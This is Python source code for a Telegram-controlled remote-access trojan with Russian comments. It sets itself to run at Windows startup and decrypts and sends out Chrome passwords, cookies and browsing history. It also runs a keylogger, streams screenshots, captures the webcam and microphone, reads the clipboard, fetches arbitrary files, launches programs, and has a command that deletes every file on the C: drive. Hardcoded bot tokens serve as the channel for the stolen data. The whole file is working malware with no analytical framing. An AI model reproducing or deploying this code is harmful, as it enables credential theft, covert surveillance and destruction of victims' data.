# -- coding: utf-8 --

import os
import cv2
import pyautogui
import pyperclip
import shutil
import threading
import time
import sqlite3
import json
import base64
import ctypes
from Cryptodome.Cipher import AES
import sounddevice as sd
from scipy.io.wavfile import write
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
from pynput import keyboard
from ctypes import wintypes
import platform
import socket
import zipfile
import webbrowser
from telebot import TeleBot


TOKEN = '8187470511:AAFc_ybNXFC0DAO5q7dukWz5XjK-u6gvYas'
OWNER_ID = 6878275251  # твой Telegram ID

SECOND_BOT_TOKEN = '8124946487:AAFauYssa1iwwgR9ULX0iJHSyhsiTcGZnX4'
SECOND_BOT_CHAT_ID = 6878275251  # куда слать скриншоты

THIRD_BOT_TOKEN = '7608532413:AAGVnm7rMi-ZVHCNCgBseVukeI6_KWuaQXU'
THIRD_BOT_CHAT_ID = 6878275251  # куда слать кейлоггер

third_bot = TeleBot(THIRD_BOT_TOKEN)
bot = TeleBot(TOKEN)

screen_streaming = False
keylogger_running = False
keylogger_buffer = ""
keylogger_listener = None
keylogger_lock = threading.Lock()

def crypt_unprotect_data(data: bytes) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_byte))]

    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32

    input_blob = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte)))
    output_blob = DATA_BLOB()

    if crypt32.CryptUnprotectData(ctypes.byref(input_blob), None, None, None, None, 0, ctypes.byref(output_blob)) == 0:
        raise ctypes.WinError()

    buffer = ctypes.string_at(output_blob.pbData, output_blob.cbData)
    kernel32.LocalFree(output_blob.pbData)

    return buffer

# ======= Защита доступа =======

def restricted(func):
    def wrapped(update: Update, context: CallbackContext, *args, **kwargs):
        if update.effective_user.id != OWNER_ID:
            update.message.reply_text("Нет доступа")
            return
        return func(update, context, *args, **kwargs)
    return wrapped

# ======= Автозагрузка =======

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(__file__)
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        shutil.copy(file_path, os.path.join(startup_dir, os.path.basename(file_path)))
    except Exception as e:
        pass  # можно добавить лог

# ======= Получение паролей Chrome =======

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return crypt_unprotect_data(buff).decode()
        except:
            return ""

def get_chrome_passwords():
    local_app_data = os.getenv("LOCALAPPDATA")
    login_db = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Login Data")
    state_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Local State")

    with open(state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = crypt_unprotect_data(encrypted_key)

    shutil.copyfile(login_db, "LoginData.db")
    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    result = []
    for url, user, pwd in cursor.fetchall():
        decrypted = decrypt_password(pwd, key)
        result.append(f"{url} | {user} | {decrypted}")

    conn.close()
    os.remove("LoginData.db")
    return result

def get_chrome_history():
    local_app_data = os.getenv("LOCALAPPDATA")
    history_db = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\History")

    shutil.copyfile(history_db, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()

    history = []
    try:
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        for url, title, time_visit in cursor.fetchall():
            history.append(f"{url} | {title}")
    except Exception as e:
        history.append(f"Ошибка: {e}")

    conn.close()
    os.remove("History.db")
    return history

def get_chrome_cookies():
    local_app_data = os.getenv("LOCALAPPDATA")
    cookies_db = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Network\Cookies")
    state_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Local State")

    with open(state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = crypt_unprotect_data(encrypted_key)

    shutil.copyfile(cookies_db, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()

    cookies = []
    try:
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, enc_value in cursor.fetchall():
            try:
                value = decrypt_password(enc_value, key)
                cookies.append(f"{host}\t{name}\t{value}")
            except:
                continue
    except Exception as e:
        cookies.append(f"Ошибка: {e}")

    conn.close()
    os.remove("Cookies.db")
    return cookies

# ======= Команды =======

@restricted
def get_chrome(update: Update, context: CallbackContext):
    lines = get_chrome_passwords()
    with open("chrome_passwords.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    update.message.reply_document(document=open("chrome_passwords.txt", "rb"))
    os.remove("chrome_passwords.txt")

@restricted
def get_clipboard(update: Update, context: CallbackContext):
    update.message.reply_text(f"Буфер обмена:\n{pyperclip.paste()}")

@restricted
def delete_all(update: Update, context: CallbackContext):
    try:
        for root, dirs, files in os.walk("C:\\", topdown=False):
            for name in files:
                try:
                    os.remove(os.path.join(root, name))
                except:
                    pass
            for name in dirs:
                try:
                    os.rmdir(os.path.join(root, name))
                except:
                    pass
        update.message.reply_text("Все возможные файлы удалены.")
    except Exception as e:
        update.message.reply_text(f"Ошибка: {e}")

@restricted
def get_camera(update: Update, context: CallbackContext):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("cam.jpg", frame)
        update.message.reply_photo(photo=open("cam.jpg", "rb"))
        os.remove("cam.jpg")
    else:
        update.message.reply_text("Камера недоступна")
    cam.release()

@restricted
def record_audio(update: Update, context: CallbackContext):
    fs = 44100
    seconds = 5
    audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write("mic.wav", fs, audio)
    update.message.reply_audio(audio=open("mic.wav", "rb"))
    os.remove("mic.wav")

# ======= Трансляция экрана =======

def screen_stream():
    global screen_streaming
    bot2 = Bot(SECOND_BOT_TOKEN)
    while screen_streaming:
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.jpg")
        with open("screen.jpg", "rb") as img:
            bot2.send_photo(chat_id=SECOND_BOT_CHAT_ID, photo=img)
        time.sleep(1)
        if os.path.exists("screen.jpg"):
            os.remove("screen.jpg")

@restricted
def screen_start(update: Update, context: CallbackContext):
    global screen_streaming
    if not screen_streaming:
        screen_streaming = True
        threading.Thread(target=screen_stream, daemon=True).start()
        update.message.reply_text("Трансляция экрана началась")
    else:
        update.message.reply_text("Трансляция уже запущена")

@restricted
def screen_stop(update: Update, context: CallbackContext):
    global screen_streaming
    screen_streaming = False
    update.message.reply_text("Трансляция остановлена")

# ======= Кейлоггер =======

def keylogger_send_buffer():
    global keylogger_buffer
    with keylogger_lock:
        if keylogger_buffer:
            bot3 = Bot(THIRD_BOT_TOKEN)
            try:
                bot3.send_message(chat_id=THIRD_BOT_CHAT_ID, text=keylogger_buffer)
            except Exception as e:
                print(f"Ошибка при отправке кейлоггера: {e}")
            keylogger_buffer = ""

def on_press(key):
    global keylogger_buffer
    try:
        key = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            key = " "
        elif key == keyboard.Key.enter:
            key = "\n"
        elif key == keyboard.Key.backspace:
            key = "[BACKSPACE]"
        else:
            key = f"[{str(key).replace('Key.', '')}]"
    with keylogger_lock:
        keylogger_buffer += key
        if len(keylogger_buffer) >= 10:
            keylogger_send_buffer()

@restricted
def start_keylogger(update: Update, context: CallbackContext):
    global keylogger_running, keylogger_listener
    if keylogger_running:
        update.message.reply_text("Кейлоггер уже запущен.")
        return
    keylogger_running = True
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    update.message.reply_text("Кейлоггер запущен.")

@restricted
def stop_keylogger(update: Update, context: CallbackContext):
    global keylogger_running, keylogger_listener
    if not keylogger_running:
        update.message.reply_text("Кейлоггер не запущен.")
        return
    keylogger_running = False
    if keylogger_listener:
        keylogger_listener.stop()
    keylogger_send_buffer()
    update.message.reply_text("Кейлоггер остановлен и данные отправлены.")

@restricted
def get_file(update: Update, context: CallbackContext):
    if len(context.args) < 1:
        update.message.reply_text("Использование: /getfile <путь>")
        return
    file_path = " ".join(context.args)
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            update.message.reply_document(f)
    else:
        update.message.reply_text("Файл не найден.")

@restricted
def sysinfo(update: Update, context: CallbackContext):
    try:
        with open("sysinfo.txt", "w", encoding="utf-8") as f:
            f.write(f"Имя пользователя: {os.getlogin()}\n")
            f.write(f"Имя компьютера: {platform.node()}\n")
            f.write(f"ОС: {platform.system()} {platform.release()}\n")
            f.write(f"Архитектура: {platform.machine()}\n")
            f.write(f"IP адрес: {socket.gethostbyname(socket.gethostname())}\n")
        
        with zipfile.ZipFile("sysinfo.zip", "w") as zf:
            zf.write("sysinfo.txt")

        update.message.reply_document(document=open("sysinfo.zip", "rb"))
    except Exception as e:
        update.message.reply_text(f"Ошибка: {e}")
    finally:
        if os.path.exists("sysinfo.txt"):
            os.remove("sysinfo.txt")
        if os.path.exists("sysinfo.zip"):
            os.remove("sysinfo.zip")

@restricted
def open_site(update: Update, context: CallbackContext):
    if len(context.args) < 1:
        update.message.reply_text("Использование: /open <url>")
        return
    url = context.args[0]
    webbrowser.open(url)
    update.message.reply_text(f"Открываю: {url}")

@restricted
def run_exe(update: Update, context: CallbackContext):
    if len(context.args) < 1:
        update.message.reply_text("Использование: /runexe <путь>")
        return
    exe_path = " ".join(context.args)
    try:
        os.startfile(exe_path)
        update.message.reply_text("Программа запущена.")
    except Exception as e:
        update.message.reply_text(f"Ошибка запуска: {e}")

@restricted
def get_history(update: Update, context: CallbackContext):
    lines = get_chrome_history()
    with open("history.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    update.message.reply_document(document=open("history.txt", "rb"))
    os.remove("history.txt")

@restricted
def get_cookies(update: Update, context: CallbackContext):
    lines = get_chrome_cookies()
    with open("cookies.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    update.message.reply_document(document=open("cookies.txt", "rb"))
    os.remove("cookies.txt")
    
# ======= Основной запуск =======

def main():
    add_to_startup()
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("getchrome", get_chrome))
    dp.add_handler(CommandHandler("clipboard", get_clipboard))
    dp.add_handler(CommandHandler("deleteall", delete_all))
    dp.add_handler(CommandHandler("camera", get_camera))
    dp.add_handler(CommandHandler("mic", record_audio))
    dp.add_handler(CommandHandler("screen_start", screen_start))
    dp.add_handler(CommandHandler("screen_stop", screen_stop))
    dp.add_handler(CommandHandler("start_keylogger", start_keylogger))
    dp.add_handler(CommandHandler("stop_keylogger", stop_keylogger))
    dp.add_handler(CommandHandler("getfile", get_file))
    dp.add_handler(CommandHandler("sysinfo", sysinfo))
    dp.add_handler(CommandHandler("open", open_site))
    dp.add_handler(CommandHandler("runexe", run_exe))   
    dp.add_handler(CommandHandler("getcookies", get_cookies))
    dp.add_handler(CommandHandler("gethistory", get_history))


    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
